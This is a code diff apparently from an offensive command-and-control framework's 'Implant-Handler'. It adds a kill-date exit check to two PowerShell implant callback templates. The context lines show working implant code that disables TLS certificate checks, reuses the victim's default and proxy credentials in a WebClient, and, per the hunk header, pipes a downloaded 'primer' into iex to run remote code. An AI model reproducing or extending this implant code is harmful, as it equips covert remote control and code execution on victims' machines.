@@ -279,6 +279,10 @@ function Implant-Handler
     # call back command
     $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 function Get-Webclient ($Cookie) {
+$d = (Get-Date -Format "dd/MM/yyyy");
+$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
+$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
+if ($k -lt $d) {exit} 
 $wc = New-Object System.Net.WebClient; 
 $wc.UseDefaultCredentials = $true; 
 $wc.Proxy.Credentials = $wc.Credentials;
@@ -340,6 +344,10 @@ primer | iex }'
         $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 function Get-Webclient ($Cookie)
 {
+$d = (Get-Date -Format "dd/MM/yyyy");
+$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
+$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
+if ($k -lt $d) {exit} 
 $username = "'+$username+'"
 $password = "'+$password+'"
 $proxyurl = "'+$proxyurl+'"
